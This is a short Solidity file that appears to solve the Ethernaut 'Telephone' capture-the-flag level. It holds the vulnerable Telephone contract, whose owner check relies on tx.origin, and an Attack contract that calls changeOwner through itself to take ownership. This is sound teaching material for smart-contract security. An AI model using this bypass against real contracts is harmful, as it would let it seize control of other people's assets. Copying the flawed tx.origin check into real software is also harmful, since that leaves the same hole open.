//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

    //tx.origin  => msg.sender
    //msg.sender => smart contract
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
    Telephone telephone;

    constructor(Telephone _telephone)public {
        telephone = _telephone;
    }

    function attack()public{
        telephone.changeOwner(msg.sender);

    }
}